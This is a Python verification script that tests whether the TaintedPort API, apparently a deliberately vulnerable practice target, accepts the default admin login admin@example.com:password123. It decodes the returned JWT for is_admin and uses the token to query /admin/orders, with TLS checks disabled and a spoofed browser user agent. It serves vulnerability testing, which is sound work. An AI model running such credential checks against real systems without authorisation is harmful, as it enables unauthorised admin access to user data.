     1	#!/usr/bin/env python3
     2	"""Verify: Default admin credentials still accepted on TaintedPort /auth/login.
     3	
     4	Exits 0 with [VULNERABLE] if admin@example.com:password123 returns a JWT with
     5	is_admin=true AND that token can list orders via /admin/orders. Exits 1 with
     6	[NOT VULNERABLE] otherwise.
     7	
     8	Optional environment variables:
     9	    TARGET_URL          Base URL (default: https://api.taintedport.com)
    10	    ADMIN_USERNAME      Default admin email  (default: admin@example.com)
    11	    ADMIN_PASSWORD      Default admin password (default: password123)
    12	
    13	Usage:
    14	    python3 verify.py
    15	"""
    16	import os, sys, json, base64, requests, urllib3
    17	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    18	
    19	TARGET_URL     = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    20	ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin@example.com")
    21	ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "password123")
    22	UA             = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " \
    23	                 "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    24	
    25	def b64url_decode(seg):
    26	    seg += "=" * (-len(seg) % 4)
    27	    return base64.urlsafe_b64decode(seg.encode())
    28	
    29	def main():
    30	    h = {"User-Agent": UA, "Content-Type": "application/json"}
    31	    try:
    32	        r = requests.post(f"{TARGET_URL}/auth/login", headers=h, verify=False, timeout=15,
    33	                          json={"email": ADMIN_USERNAME, "password": ADMIN_PASSWORD})
    34	    except Exception as e:
    35	        print(f"[NOT VULNERABLE] request error: {e}"); sys.exit(1)
    36	
    37	    if r.status_code != 200 or not r.json().get("token"):
    38	        print(f"[NOT VULNERABLE] login rejected — HTTP {r.status_code}: {r.text[:200]}")
    39	        sys.exit(1)
    40	
    41	    token = r.json()["token"]
    42	    try:
    43	        payload = json.loads(b64url_decode(token.split(".")[1]))
    44	    except Exception as e:
    45	        print(f"[NOT VULNERABLE] cannot decode JWT: {e}"); sys.exit(1)
    46	
    47	    if not payload.get("is_admin"):
    48	        print(f"[NOT VULNERABLE] JWT does not contain is_admin=true: {payload}")
    49	        sys.exit(1)
    50	
    51	    r2 = requests.get(f"{TARGET_URL}/admin/orders", verify=False, timeout=15,
    52	                      headers={"User-Agent": UA, "Authorization": f"Bearer {token}"})
    53	    if r2.status_code == 200 and r2.json().get("success") and r2.json().get("orders"):
    54	        n = len(r2.json()["orders"])
    55	        print(f"[VULNERABLE] default creds accepted; JWT is_admin=true; "
    56	              f"/admin/orders returned {n} orders")
    57	        sys.exit(0)
    58	    else:
    59	        print(f"[NOT VULNERABLE] /admin/orders denied — HTTP {r2.status_code}: {r2.text[:200]}")
    60	        sys.exit(1)
    61	
    62	if __name__ == "__main__":
    63	    main()